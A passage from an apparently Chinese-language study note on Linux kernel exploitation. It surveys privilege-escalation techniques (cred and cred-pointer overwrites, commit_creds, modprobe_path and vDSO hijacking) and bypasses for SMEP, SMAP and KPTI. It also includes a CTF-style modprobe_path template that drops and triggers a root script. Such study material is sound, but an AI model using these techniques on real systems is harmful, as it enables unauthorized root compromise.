class="headerlink" title="间接定位"></a>间接定位</h6><p>不一定非得知道 <code>cred</code> 的具体位置，只需要能够修改 <code>cred</code> 即可</p><p><strong>UAF 使用同样堆块-过时</strong></p><p>如果我们在进程初始化时能控制 <code>cred</code> 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的,且不需要任何信息泄露，例子:</p><ol><li>申请一块与 <code>cred</code> 结构体大小一样的堆块</li><li>释放该堆块</li><li><code>fork</code> 出新进程，恰好使用刚刚释放的堆块</li><li>修改 <code>cred</code> 结构体特定内存，从而提权</li></ol><p><strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 <code>cred_jar</code> 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __init <span class="token function">cred_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* allocate a slab in which we can store credentials */</span>    cred_jar <span class="token operator">=</span> <span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token string">"cred_jar"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>            SLAB_HWCACHE_ALIGN<span class="token operator">|</span>SLAB_PANIC<span class="token operator">|</span>SLAB_ACCOUNT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改-task-struct-结构体中的-cred-指针"><a href="#修改-task-struct-结构体中的-cred-指针" class="headerlink" title="修改 task_struct 结构体中的 cred 指针"></a>修改 task_struct 结构体中的 cred 指针</h5><h6 id="定位cred结构体指针具体位置"><a href="#定位cred结构体指针具体位置" class="headerlink" title="定位cred结构体指针具体位置"></a>定位cred结构体指针具体位置</h6><ul><li><p>间接定位</p><ul><li><p><code>task_struct</code></p><p><code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，可以定位<code>task_struct</code> 结构体的地址,再根据 <code>cred</code> 指针的偏移计算得出 <code>cred</code> 指针地址</p></li><li><p><code>comm</code></p><p>在<code>cred</code>指针正下方，可以使用 <code>prctl</code> 设置进程的 <code>comm</code> 为一个特殊的字符串，然后再定位 <code>comm</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>real_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>cred<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>          <span class="token operator">*</span>cached_requested_key<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">char</span>                comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>修改</p><ul><li>修改 <code>cred</code> 指针为内核镜像中<strong>已有的</strong><code> init_cred</code> 的地址。这种方法适合于我们<strong>能够直接修改 cred 指针以及知道 init_cred 地址</strong>的情况</li><li>伪造一个 <code>cred</code>，然后修改 <code>cred</code> 指针指向该地址即可。比较麻烦，一般不使用</li></ul></li></ul><h6 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h6><ul><li><p><code>commit_creds(&amp;init_cred)</code></p><p><code>commit_creds()</code> :将一个新的 <code>cred</code> 设为当前进程 <code>task_struct</code> 的 <code>real_cred</code> 与 <code>cred</code> 字段，调用该函数并传入一个具有 <code>root</code> 权限的 <code>cred</code>，则能直接完成对当前进程的提权工作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task <span class="token operator">=</span> current<span class="token punctuation">;</span><span class="token comment">//内核宏，用以从 percpu 段获取当前进程的 PCB</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old <span class="token operator">=</span> task<span class="token operator">-></span>real_cred<span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token function">rcu_assign_pointer</span><span class="token punctuation">(</span>task<span class="token operator">-></span>real_cred<span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rcu_assign_pointer</span><span class="token punctuation">(</span>task<span class="token operator">-></span>cred<span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在内核初始化过程当中会以 <code>root</code> 权限启动 <code>init</code> 进程，其 <code>cred</code> 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> init_cred <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>usage          <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>    <span class="token punctuation">.</span>subscribers        <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>magic          <span class="token operator">=</span> CRED_MAGIC<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token punctuation">.</span>uid            <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>gid            <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>suid           <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>sgid           <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>euid           <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>egid           <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>fsuid          <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>fsgid          <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>securebits     <span class="token operator">=</span> SECUREBITS_DEFAULT<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_inheritable    <span class="token operator">=</span> CAP_EMPTY_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_permitted      <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_effective      <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_bset       <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>user           <span class="token operator">=</span> INIT_USER<span class="token punctuation">,</span>    <span class="token punctuation">.</span>user_ns        <span class="token operator">=</span> <span class="token operator">&amp;</span>init_user_ns<span class="token punctuation">,</span>    <span class="token punctuation">.</span>group_info     <span class="token operator">=</span> <span class="token operator">&amp;</span>init_groups<span class="token punctuation">,</span>    <span class="token punctuation">.</span>ucounts        <span class="token operator">=</span> <span class="token operator">&amp;</span>init_ucounts<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</p><p><code>prepare_kernel_cred()</code> 函数用以拷贝指定进程的 <code>cred</code> 结构体，参数为 <code>NULL </code>时，该函数会拷贝 <code>init_cred</code> 并返回一个有着 <code>root</code> 权限的 <code>cred</code>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>    new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">kdebug</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred() alloc %p"</span><span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>daemon<span class="token punctuation">)</span>        old <span class="token operator">=</span> <span class="token function">get_task_cred</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        old <span class="token operator">=</span> <span class="token function">get_cred</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>能直接完成提权的工作</p><p>不过自从内核版本 <code>6.2</code> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，因此内核<code>6.2</code>之后失效</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span><span class="token operator">!</span>daemon<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="改变别人"><a href="#改变别人" class="headerlink" title="改变别人"></a>改变别人</h4><p>通过影响高权限进程的执行，使其完成我们想要的功能</p><h5 id="改数据"><a href="#改数据" class="headerlink" title="改数据"></a>改数据</h5><p><strong>符号链接</strong></p><p>如果一个 <code>root </code>权限的进程会执行一个<strong>符号链接</strong>的程序，并且该<strong>符号链接或者符号链接指向的程序</strong>可以由攻击者控制，攻击者就可以实现提权</p><ul><li><p><code>call_usermodehelper</code></p><p>一种内核线程执行用户态应用的方式，并且启动的进程具有<code>root</code>权限，通过改变某个变量指定的具体要执行的应用提权</p><ul><li><p>修改<code>modprobe_path</code></p><ul><li>获取<code>modprobe_path</code>地址<ul><li>直接定位：取值确定，<code>modprobe_path</code>扫描内存寻找字符串</li><li>间接定位：相对内核基址偏移固定，先获取内核基址再通过偏移得到地址</li></ul></li><li>修改<code>modprobe_path</code>为指定的程序</li><li>触发 <code>call_modprobe</code><ul><li>执行满足相应要求的非法可执行文件</li><li>使用未知协议触发</li></ul></li></ul><p>模板如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// step 1. modify modprobe_path to the target value</span><span class="token comment">// step 2. create related file</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag' > /home/pwn/catflag.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/pwn/catflag.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// step 3. trigger it using unknown executable</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// step 3. trigger it using unknown protocol</span><span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改 <code>poweroff_cmd</code></p></li></ul></li><li><p><code>poweroff_cmd</code></p><ul><li>获取<code>poweroff_cmd</code>地址，方法同上</li><li>修改 <code>poweroff_cmd</code> 为指定的程序</li><li>劫持控制流执行 <code>__orderly_poweroff</code></li></ul></li></ul><h5 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h5><p>修改<code>root</code>权限执行的代码，内核中 <code>vDSO</code> 的代码会被映射到所有的用户态进程中,高特权的进程周期性地调用 <code>vDSO</code> 中的函数时可以考虑把 <code>vDSO</code> 中相应的函数修改为特定的 <code>shellcode</code>,早期<code>vDSO</code> 是可写的，后来引入 <code>post-init read-only</code> 的数据，即将初始化后不再被写的数据标记为只读，来防御这样的利用</p><ul><li><p>定位 <code>vDSO</code></p><ul><li><p><code>IDA</code>在<code>vmlinux</code>里定位<code>vDSO</code></p><p>点击<code>init_vdso函数 -&gt; vdso_image_64 / vdso_image_x32 -&gt; raw_data</code></p><p>或直接使用<code>raw_data</code>来寻找<code>vDSO</code></p></li><li><p>内存中定位</p><p>直接定位：<code>vDSO</code>是一个<code>ELF</code>文件，有<code>ELF</code>文件头，<code>vDSO</code>特定位置存储导出函数的字符串，根据这两个特征扫描内存</p><p><code>vDSO</code>相对内核基址偏移固定，先获取内核基址再根据偏移得到地址</p></li></ul></li><li><p>修改 <code>vDSO</code> 的特定函数为指定的 <code>shellcode</code></p></li><li><p>等待触发执行 <code>shellcode</code></p></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h5 id="改变自身-1"><a href="#改变自身-1" class="headerlink" title="改变自身"></a>改变自身</h5><ul><li>改<code>cred</code>结构体：扫描内存定位&#x2F;<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体位置，通过任意地址写&#x2F;<code>rop</code>来改<code>cred</code>中的<code>uid-fsgid</code>为<code>0</code></li><li>改<code>cred</code>结构体指针：<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体指针位置，能够直接修改 <code>cred</code> 指针以及知道有<code>root</code>权限的 <code>init_cred</code> 地址时，修改 <code>cred</code> 指针为内核镜像中已有的<code> init_cred</code> 的地址</li><li><code>UAF</code> 使用同样堆块控制<code>cred</code>结构体-过时</li><li><code>commit_creds(&amp;init_cred)</code>，传入有<code>root</code>权限的<code>init_cred</code>的地址</li><li><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</li></ul><h5 id="改变别人-1"><a href="#改变别人-1" class="headerlink" title="改变别人"></a>改变别人</h5><ul><li>修改<code>modprobe_path</code>为指定程序之后触发 <code>call_modprobe</code></li><li>修改 <code>poweroff_cmd</code> 为指定的程序之后触发<code>__orderly_poweroff</code></li><li>写<code>vDSO</code>为<code>shellcode</code></li></ul><h3 id="泄露敏感信息"><a href="#泄露敏感信息" class="headerlink" title="泄露敏感信息"></a>泄露敏感信息</h3><p>需要我们具有读取内核数据的能力，具体想要泄漏什么数据与利用场景紧密相关</p><h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>即使得内核崩溃</p><ul><li>触发内核中的某个<strong>漏洞</strong>让内核崩溃</li><li>触发内核中的<strong>死锁</strong></li><li>触发<strong>大量的内核内存泄漏</strong>，即存在大量的内存被申请但是没有被释放</li></ul><h2 id="内核防御机制"><a href="#内核防御机制" class="headerlink" title="内核防御机制"></a>内核防御机制</h2><h3 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h3><h4 id="内核态和用户态的隔离"><a href="#内核态和用户态的隔离" class="headerlink" title="内核态和用户态的隔离"></a>内核态和用户态的隔离</h4><h5 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h5><p><strong>用户态</strong>不可直接<strong>访问</strong>内核态的<strong>数据</strong>、执行内核态的<strong>代码</strong></p><h5 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h5><p><strong>内核态</strong>不可<strong>执行</strong>用户态的代码&#x2F;用户代码不可执行，位于<code>cr4</code>的第<code>20</code>位，不开的话会导致攻击者控制了内核中的执行流，就可以执行处于用户态的代码，由于用户态的代码是攻击者可控的，所以更容易实施攻击</p><p><strong>开启</strong>：默认开启，<code>qemu</code>开启在启动时加<code>-append +smep</code></p><p><strong>关闭</strong>：<code>/etc/default/grub</code>中如下两行添加<code>nosmep</code>，运行<code>update-grub</code>并重启系统，<code>qemu</code>中加<code>-append nosmep</code></p><pre class="line-numbers language-none"><code class="language-none">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet&quot;  GRUB_CMDLINE_LINUX&#x3D;&quot;initrd&#x3D;&#x2F;install&#x2F;initrd.gz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>状态查看</strong>：存在<code>smep</code>字符即开启了<code>smep</code>保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> smep /proc/cpuinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>攻击</strong>：内核中存在固定的修改<code>cr4</code>的代码，比如<code>refresh_pce</code>函数、<code>set_tsc_mode</code>函数，或者控制程序流后执行内核中的<code>gadget</code>修改，将<code>CR4</code>寄存器第<code>20</code>位置<code>0</code>后即关闭<code>smep</code>，一般将<code>CR4</code>设置位<code>0x6f0</code>，这样同时也关闭了<code>smap</code></p><h5 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h5><p><strong>内核态</strong>不可<strong>访问</strong>用户态的数据&#x2F;用户数据不可访问，位于<code>cr4</code>的第<code>21</code>位，不开<code>smap</code>可能导致攻击者可以通过栈迁移将栈迁移到用户态，然后进行 <code>ROP</code></p><p><strong>开启&#x2F;关闭&#x2F;状态查看</strong>：同上</p><p><strong>攻击</strong>：设置<code>rc4</code>同上，劫持程序流之后可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志</p><h5 id="KPTI-Kernel-Page-Table-Isolation"><a href="#KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="KPTI-Kernel Page Table Isolation"></a>KPTI-Kernel Page Table Isolation</h5><p><strong>用户态</strong>不可看到内核态的<strong>页表</strong>；<strong>内核态</strong>不可<strong>执行用户</strong>态的<strong>代码</strong>,进一步增强了用户态和内核态内存的隔离，在开启 <code>KPTI</code> 机制后，用户态进入内核态或内核态进入用户态时都会进行页表切换</p><ul><li>内核态页表：用户空间内存的页表（标记为不可执行，类似<code>smep</code>，未开启<code>smap</code>则仍然可以访问用户态空间内存，只是不能执行<code>shellcode</code>）+内核空间内存的页表</li><li>用户态的页表：用户空间内存的页表+必要的内核空间内存的页表（如用于处理系统调用、中断等信息的内存</li></ul><p><code>Linux 4.15</code> 中引入了 <code>KPTI </code>机制，并且该机制被反向移植到了 <code>Linux 4.14.11</code>，<code>4.9.75，4.4.110</code></p><p><strong>开启：</strong><code>-append kpti=1</code></p><p><strong>关闭</strong>：<code>-append nopti</code></p><p><strong>状态查看</strong>：<code>dmesg | grep &#39;page table&#39;</code></p><p><strong>攻击</strong>：<code>KPTI</code> 机制和 <code>SMAP 、SMEP</code> 不太一样，由于与源码紧密结合，似乎没有办法在运行时刻关闭</p><ul><li><p>修改页表</p><p>用户态空间所有数据被标记了<code>NX</code>，可以修改对应页表权限，未开<code>smep</code>修改后可以返回到用户态执行用户态代码</p></li><li><p><code>SWITCH_TO_USER_CR3_STACK</code></p><p>控制内核执行返回用户态时执行的切换页表代码判断也可以正常返回到用户态，页表切换主要靠<code>SWITCH_TO_USER_CR3_STACK</code>汇编宏，只要能调用这部分代码即可进行页表切换</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.macro SWITCH_TO_USER_CR3_STACK scratch_reg:req    pushq   %rax    SWITCH_TO_USER_CR3_NOSTACK scratch_reg&#x3D;\scratch_reg scratch_reg2&#x3D;%rax    popq    %rax.endm.macro SWITCH_TO_USER_CR3_NOSTACK scratch_reg:req scratch_reg2:req    ALTERNATIVE &quot;jmp .Lend_\@&quot;, &quot;&quot;, X86_FEATURE_PTI    mov %cr3, \scratch_reg    ALTERNATIVE &quot;jmp .Lwrcr3_\@&quot;, &quot;&quot;, X86_FEATURE_PCID    &#x2F;*     * Test if the ASID needs a flush.     *&#x2F;    movq    \scratch_reg, \scratch_reg2    andq    $(0x7FF), \scratch_reg      &#x2F;* mask ASID *&#x2F;    bt  \scratch_reg, THIS_CPU_user_pcid_flush_mask    jnc .Lnoflush_\@    &#x2F;* Flush needed, clear the bit *&#x2F;    btr \scratch_reg, THIS_CPU_user_pcid_flush_mask    movq    \scratch_reg2, \scratch_reg    jmp .Lwrcr3_pcid_\@.Lnoflush_\@:    movq    \scratch_reg2, \scratch_reg    SET_NOFLUSH_BIT \scratch_reg.Lwrcr3_pcid_\@:    &#x2F;* Flip the ASID to the user version *&#x2F;    orq $(PTI_USER_PCID_MASK), \scratch_reg.Lwrcr3_\@:    &#x2F;* Flip the PGD to the user version *&#x2F;    orq     $(PTI_USER_PGTABLE_MASK), \scratch_reg    mov \scratch_reg, %cr3.Lend_\@:.endm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页表切换后还要返回到用户态，需要复用内核中返回至用户态的代码，主要有两种方式：<code>iret</code>和<code>sysret</code></p><ul><li><p><code>iret</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)#ifdef CONFIG_DEBUG_ENTRY    &#x2F;* Assert that pt_regs indicates user mode. *&#x2F;    testb   $3, CS(%rsp)    jnz 1f    ud21:#endif    POP_REGS pop_rdi&#x3D;0    &#x2F;*     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.     * Save old stack pointer and switch to trampoline stack.     *&#x2F;    movq    %rsp, %rdi    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp    UNWIND_HINT_EMPTY    &#x2F;* Copy the IRET frame to the trampoline stack. *&#x2F;    pushq   6*8(%rdi)   &#x2F;* SS *&#x2F;    pushq   5*8(%rdi)   &#x2F;* RSP *&#x2F;    pushq   4*8(%rdi)   &#x2F;* EFLAGS *&#x2F;    pushq   3*8(%rdi)   &#x2F;* CS *&#x2F;    pushq   2*8(%rdi)   &#x2F;* RIP *&#x2F;    &#x2F;* Push user RDI on the trampoline stack. *&#x2F;    pushq   (%rdi)    &#x2F;*     * We are on the trampoline stack.  All regs except RDI are live.     * We can do future final exit work right here.     *&#x2F;    STACKLEAK_ERASE_NOCLOBBER    SWITCH_TO_USER_CR3_STACK scratch_reg&#x3D;%rdi    &#x2F;* Restore RDI. *&#x2F;    popq    %rdi    SWAPGS    INTERRUPT_RETURN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造如下栈跳转到<code>movq %rsp, %rdi</code>就可以切换页表并且返回至用户态</p><pre class="line-numbers language-none"><code class="language-none">fake raxfake rdiRIPCSEFLAGSRSPSS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>sysret</code></p><p><code>rcx</code>、<code>r11</code>取值</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">rcx, save the rip of the code to be executed when returning to userspacer11, save eflags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造栈</p><pre class="line-numbers language-none"><code class="language-none">fake rdirsp, the stack of the userspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>跳转<code>entry_SYSCALL_64</code>的如下部分即可返回到用户态</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">SWITCH_TO_USER_CR3_STACK scratch_reg&#x3D;%rdi    popq    %rdi    popq    %rsp    swapgs    sysretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>signal handler</code></p><p>在用户态注册<code>signal handler</code>来执行用户态的代码，无需切换页表</p></li></ul><h4 id="内核自身内部不同对象间的隔离"><a href="#内核自身内部不同对象间的隔离" class="headerlink" title="内核自身内部不同对象间的隔离"></a>内核自身内部不同对象间的隔离</h4><h5 id="堆块隔离"><a href="#堆块隔离" class="headerlink" title="堆块隔离"></a>堆块隔离</h5><h6 id="GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离"><a href="#GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离" class="headerlink" title="GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离"></a>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离</h6><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code>。</p><p>在 <code>5.9</code> 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，自内核版本 5.14 起又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 <code>kernel</code> 而言（默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> 